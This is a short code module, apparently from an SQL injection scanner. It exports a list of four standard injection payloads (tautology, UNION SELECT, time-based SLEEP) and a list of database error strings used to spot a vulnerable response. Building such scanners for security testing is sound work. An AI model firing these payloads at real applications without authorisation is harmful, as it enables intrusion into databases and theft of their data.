export const payloads = [
    "' OR '1'='1",
    "' UNION SELECT null,null,null--",
    "' AND SLEEP(5)--",
    "' OR 1=1--"
  ]

export const sqlErrorIndicators = [
    "SQL syntax",
    "mysql_fetch",
    "syntax error",
    "ORA-",
    "Unclosed quotation mark",
    "PG::",
    "SQLite3::",
    "near \"",
    "unterminated"
  ]